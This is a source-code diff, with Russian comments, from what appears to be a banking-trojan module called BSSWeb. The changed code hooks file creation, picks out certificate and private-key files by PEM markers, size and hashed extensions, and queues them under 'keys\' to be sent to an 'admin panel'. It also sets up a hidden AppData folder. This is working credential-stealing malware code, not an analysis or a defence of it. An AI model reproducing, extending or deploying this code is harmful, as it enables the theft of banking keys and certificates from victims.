@@ -36,48 +36,35 @@ namespace BSSWeb
 	PList hashKeys = 0; //список ключей которые уже сохранили
 	CRITICAL_SECTION csHashKeys;
 
-	//true - если файл является файлом ключем, а также отсылает его в админку
-	int IsFileKey( FileGrabber::ParamEvent* e )
+	//отсылает найденные файлы ключи в админку
+	int FileIsKey( FileGrabber::ParamEvent* e )
 	{
-		if( e->data )
+		//смотрим добавляли ли уже найденный ключ
+		DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
+		bool exists = true;
+		pEnterCriticalSection(&csHashKeys);
+		if( List::IndexOf( hashKeys, (LPVOID)hashFile ) < 0 )
 		{
-			DWORD hash = 0;
-			int lenExt = 0; //длина расширения
-			if( e->extFile )
-			{
-				hash = STR::GetHash( (char*)e->extFile, 0, true );
-				lenExt = m_lstrlen(e->extFile);
-			}
-			if( lenExt <= 3 && hash != 0x1D36F0 /* tmp */ && hash != 0x1AB867 /* jpg */ && hash != 0x1CF4E7 /* sig */ &&
-				hash != 0x1D3C74 /* txt */ && hash != 0x1A71EF /* ico */ && hash != 0x1C3767 /* png */)
-			{
-				//смотрим добавляли ли уже найденный ключ
-				DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
-				bool exists = true;
-				pEnterCriticalSection(&csHashKeys);
-				if( List::IndexOf( hashKeys, (LPVOID)hashFile ) < 0 )
-				{
-					List::Add( hashKeys, (LPVOID)hashFile );
-					exists = false;
-				}
-				pLeaveCriticalSection(&csHashKeys);
-				if( !exists )
-				{
-					//ищем символ : разделитель диска
-					const char* p = e->fileName;
-					while( *p && *p != ':' ) p++;
-					if( *p == 0 ) //диска нет, значит скорее всего сетевая папка
-						p = e->fileName;
-					else
-						p++; //обходим :
-					//игнорируем начальные слеши 
-					while( *p == '\\' || *p == '/' ) p++;
-					//формируем имя файла для архива
-					m_lstrcpy( e->nameSend, "keys\\" );
-					m_lstrcat( e->nameSend, p );
-					return FileGrabber::SENDFILE;
-				}
-			}
+			List::Add( hashKeys, (LPVOID)hashFile );
+			exists = false;
+		}
+		pLeaveCriticalSection(&csHashKeys);
+		if( !exists )
+		{
+			DBGBSS( "BSS", "KeyFile: '%s'", e->fileName );
+			//ищем символ : разделитель диска
+			const char* p = e->fileName;
+			while( *p && *p != ':' ) p++;
+			if( *p == 0 ) //диска нет, значит скорее всего сетевая папка
+				p = e->fileName;
+			else
+				p++; //обходим :
+			//игнорируем начальные слеши 
+			while( *p == '\\' || *p == '/' ) p++;
+			//формируем имя файла для архива
+			m_lstrcpy( e->nameSend, "keys\\" );
+			m_lstrcat( e->nameSend, p );
+			return FileGrabber::SENDFILE;
 		}
 		return 0;
 	}
@@ -91,15 +78,24 @@ namespace BSSWeb
 
 		FileGrabber::Init(FileGrabber::CREATEFILEA /*| FileGrabber::CREATEFILEW*/ );
 		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
-		rv->FuncReceiver = IsFileKey;
+		rv->FuncReceiver = FileIsKey;
 		rv->minSize = 16;
-		rv->maxSize = 2560;
-		rv->aw |= FileGrabber::LOADFILE | FileGrabber::FILEISBIN | FileGrabber::FILEISBASE64;
+		rv->maxSize = 5120;
+		rv->aw |= FileGrabber::FILEISBIN | FileGrabber::FILEISBASE64;
 		rv->maska = "-BEGIN CERTIFICATE-*-END CERTIFICATE-";
 		const char gifFormat[] = { 'G', 'I', 'F', 0 };
 		const char pngFormat[] = { 0x89, 'P', 'N', 'G', 0 };
 		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //игнорируем формат gif
 		FileGrabber::AddIgnoreBeg( rv, pngFormat ); //игнорируем формат png
+
+		const DWORD ignoreExt[] =
+			{ 0x1D36F0 /* tmp */, 0x1AB867 /* jpg */, 0x1CF4E7 /* sig */, 0x1D3C74 /* txt */,
+			  0x1A71EF /* ico */, 0x1C3767 /* png */, 0 };
+		const DWORD neededExt[] = //хеши скопированы с модуля bss.cpp, поэтому неизвестно какие это расширения )
+			{ 0x18F2F2, 0x1AF2F9, 0x1CF2E3, 0x1C3AE2, 0x18F96C, 0x1BF871, 0x193133, 0x1C32ED, 0x1CB2F1, 0
+			};
+		FileGrabber::AddIgnoreExt( rv, ignoreExt );
+		FileGrabber::AddNeededExt( rv, neededExt );
 
 		FileGrabber::AddReceiver(rv);
 
@@ -326,7 +322,7 @@ void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
 
 	pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE);
 
-	Path.CalcLength();  // Рассмотреть целесообразность такого подхода
+	Path.CalcLength();
 
 	Path += "\\BSS.V1\\";
 	CreateDirectoryA(Path.t_str(), NULL);
